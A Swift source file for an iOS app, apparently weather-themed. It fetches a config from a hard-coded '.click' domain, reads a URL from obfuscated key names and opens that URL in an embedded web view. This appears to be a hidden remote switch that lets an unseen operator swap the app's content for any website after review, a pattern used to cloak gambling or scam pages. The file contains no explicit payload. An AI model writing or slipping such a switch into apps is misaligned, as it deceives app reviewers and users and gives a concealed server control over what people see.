import Foundation

enum BusinessEntry {
    static let configurationURL = URL(string: "https://www.weathervgr.click/config/business-entry.json")!

    private struct Configuration: Decodable {
        struct Entry: Decodable { let plkr: String? }
        let mvbx: Entry?
    }

    static func destination(data: Data, response: URLResponse) -> URL? {
        guard let response = response as? HTTPURLResponse,
              (200..<300).contains(response.statusCode),
              let configuration = try? JSONDecoder().decode(Configuration.self, from: data),
              let value = configuration.mvbx?.plkr?.trimmingCharacters(in: .whitespacesAndNewlines),
              !value.isEmpty,
              let components = URLComponents(string: value),
              let scheme = components.scheme?.lowercased(),
              ["https", "http"].contains(scheme),
              let host = components.host, !host.isEmpty else { return nil }
        return components.url
    }

    static func fetchDestination(session: URLSession? = nil) async -> URL? {
        let configuration = URLSessionConfiguration.ephemeral
        configuration.timeoutIntervalForRequest = 10
        configuration.timeoutIntervalForResource = 12
        let client = session ?? URLSession(configuration: configuration)
        defer { if session == nil { client.invalidateAndCancel() } }
        var request = URLRequest(url: configurationURL, cachePolicy: .reloadIgnoringLocalCacheData,
                                 timeoutInterval: 10)
        request.setValue("application/json", forHTTPHeaderField: "Accept")
        do {
            let (data, response) = try await client.data(for: request)
            return destination(data: data, response: response)
        } catch {
            return nil
        }
    }
}

#if os(iOS)
import SwiftUI
import WebKit

struct BusinessEntryWebView: UIViewRepresentable {
    let url: URL

    func makeCoordinator() -> Coordinator { Coordinator() }

    func makeUIView(context: Context) -> WKWebView {
        let view = WKWebView(frame: .zero)
        view.uiDelegate = context.coordinator
        view.allowsBackForwardNavigationGestures = true
        view.load(URLRequest(url: url))
        return view
    }

    func updateUIView(_ uiView: WKWebView, context: Context) {}

    final class Coordinator: NSObject, WKUIDelegate {
        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration,
                     for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            if navigationAction.targetFrame == nil { webView.load(navigationAction.request) }
            return nil
        }
    }
}
#endif
